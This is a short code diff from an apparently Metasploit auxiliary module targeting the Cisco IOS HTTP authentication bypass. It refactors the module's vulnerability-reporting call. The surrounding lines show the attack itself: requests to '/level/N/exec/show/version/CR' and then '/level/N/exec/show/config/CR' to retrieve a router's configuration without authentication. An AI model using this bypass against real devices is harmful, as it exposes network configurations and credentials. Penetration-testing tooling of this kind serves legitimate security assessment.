@@ -58,15 +58,18 @@ class Metasploit3 < Msf::Auxiliary
 			
 			if res and res.body and res.body =~ /Cisco Internetwork Operating System Software/
 				print_good("#{rhost}:#{rport} Found vulnerable privilege level: #{level}")
-				
+
 				report_vuln(
-					:host	=> rhost,
-					:port	=> rport,
-					:proto  => 'tcp',
-					:name	=> 'IOS-HTTP-AUTH-BYPASS',
-					:data	=> "http://#{rhost}:#{rport}/level/#{level}/exec/show/version/CR"
+					{
+						:host	=> rhost,
+						:port	=> rport,
+						:proto  => 'tcp',
+						:name	=> 'IOS-HTTP-AUTH-BYPASS',
+						:info	=> "http://#{rhost}:#{rport}/level/#{level}/exec/show/version/CR",
+						:refs   => self.references
+					}
 				)
-				
+
 				res = send_request_cgi({
 					'uri'  		=>  "/level/#{level}/exec/show/config/CR",
 					'method'   	=> 'GET'
